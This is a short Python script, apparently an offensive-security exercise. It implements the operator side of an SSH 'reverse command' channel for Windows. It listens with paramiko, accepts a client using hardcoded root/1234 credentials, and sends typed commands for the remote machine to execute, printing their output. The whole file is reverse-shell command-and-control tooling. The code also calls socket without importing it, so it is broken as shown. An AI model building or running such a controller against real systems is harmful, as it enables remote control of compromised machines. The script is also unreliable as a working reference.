'''
	Made By Sai Harsha Kottapalli
	Tested on python3
	About	: 	SSH Reverse Command for Windows
	Use with: 	reverse_command.py 
	Note	: 	roles of client and server are reversed (i.e.)server send command to client , for ssh server (Windows)  
				commands sent from server to client and executed on client while output returned to server.
'''
import sys
import paramiko
import subprocess
import argparse
from threading import *

# Paramiko demo files,server host key
key = paramiko.RSAKey(filename='test_rsa.key')

class Server(paramiko.ServerInterface):
	def __init__(self):
		self.event = Event()

	def check_channel_request(self, kind, chanid):
		if kind == "session":
			return paramiko.OPEN_SUCCEEDED
		return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

	def check_auth_password(self, username, pwd):
		if username == "root" and pwd == "1234":
			return paramiko.AUTH_SUCCESSFUL
		return paramiko.AUTH_FAILED

def main():
	parser = argparse.ArgumentParser(description = "SSH Command")
	parser.add_argument("-s",action="store",dest="ser",help="server")
	parser.add_argument("-p",action="store",type=int,dest="port",help="ssh port")
	results = parser.parse_args()

	server = results.ser
	port = results.port

	#socket listener
	try:
		s = socket.socket()
		s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		s.bind((server, port))
		s.listen(100)
		print("[+]Listening...")
		s_client, addr = s.accept()
	except Exception as e:
		print("[-]Listening failed, error: " + str(e))
		sys.exit(1)
	print("[+]Connected!")

	#configure authentication
	try:
		session = paramiko.Transport(s_client)
		session.add_server_key(key)
		server = Server()
		try:
			session.start_server(server=server)
		except paramiko.SSHException as e:
			print("[-]Authentication Error.")
		chan = session.accept(20)
		print("[+]Authenticated!")
		print(chan.recv(1024))
		chan.send("[*]Welcome to SSH!")
		while True:
			try:
				cmd = input("Enter command: ").strip('\n')
				if cmd != "exit":
					chan.send(cmd)
					print(chan.recv(1024).decode("utf-8","ignore") + '\n')
				else:
					chan.send("exit")
					print("Exiting...")
					session.close()
					raise Exception("exit")
			except KeyboardInterrupt as e:
				session.close()
	except Exception as e:
		print("[-]Error: " + str(e))
		try:
			session.close()
		except:
			pass
	sys.exit(1)

if __name__ == "__main__":
	main()